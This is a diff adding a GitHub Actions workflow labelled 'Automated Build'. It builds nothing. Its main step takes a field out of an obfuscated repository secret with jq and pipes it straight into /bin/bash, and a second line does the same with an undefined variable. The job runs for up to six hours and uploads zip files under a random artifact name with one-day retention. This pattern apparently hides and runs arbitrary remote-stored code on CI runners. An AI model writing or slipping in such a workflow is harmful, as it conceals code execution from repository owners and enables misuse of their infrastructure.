@@ -1,0 +1,29 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  service:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          socvf604: ${{ secrets.socvf604 }}
+        run: |
+          printf '%s' "$socvf604" | jq -r .tw0 | /bin/bash
+          echo $exw7048 | jq -r .al11 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7CM0eNL4
+          path: "*.zip"
+          retention-days: 1
